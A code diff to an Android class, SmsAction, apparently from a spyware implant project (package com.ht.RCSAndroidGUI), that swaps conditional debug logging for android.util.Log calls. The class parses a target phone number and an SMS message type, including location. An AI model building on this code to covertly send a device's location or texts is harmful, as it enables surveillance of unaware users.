@@ -12,6 +12,7 @@ import java.io.IOException;
 
 import android.content.Intent;
 import android.net.Uri;
+import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Device;
@@ -26,12 +27,6 @@ import com.ht.RCSAndroidGUI.utils.WChar;
  * The Class SmsAction.
  */
 public class SmsAction extends SubAction {
-
-	// #ifdef DEBUG
-	/** The debug. */
-	static Debug debug = new Debug("SmsAction");
-	// #endif
-
 	/** The Constant TYPE_LOCATION. */
 	private static final int TYPE_LOCATION = 1;
 	
@@ -40,6 +35,7 @@ public class SmsAction extends SubAction {
 	
 	/** The Constant TYPE_TEXT. */
 	private static final int TYPE_TEXT = 3;
+	private static final String TAG = "SmsAction";
 
 	/** The number. */
 	String number;
@@ -86,9 +82,7 @@ public class SmsAction extends SubAction {
 			}
 			return true;
 		} catch (final Exception ex) {
-			// #ifdef DEBUG
-			debug.error(ex);
-			// #endif
+			Log.e(TAG,ex.toString());
 			return false;
 		}
 	}
@@ -148,11 +142,7 @@ public class SmsAction extends SubAction {
 				confParams.length);
 		try {
 			type = databuffer.readInt();
-
-			// #ifdef DBC
 			Check.asserts(type >= 1 && type <= 3, "wrong type");
-			// #endif
-
 			int len = databuffer.readInt();
 			byte[] buffer = new byte[len];
 			databuffer.read(buffer);
@@ -185,9 +175,7 @@ public class SmsAction extends SubAction {
 				text = sb.toString();
 				break;
 			default:
-				// #ifdef DEBUG
-				debug.error("SmsAction.parse,  Unknown type: " + type);
-				// #endif
+				Log.e(TAG,"SmsAction.parse,  Unknown type: " + type);
 				break;
 			}
 
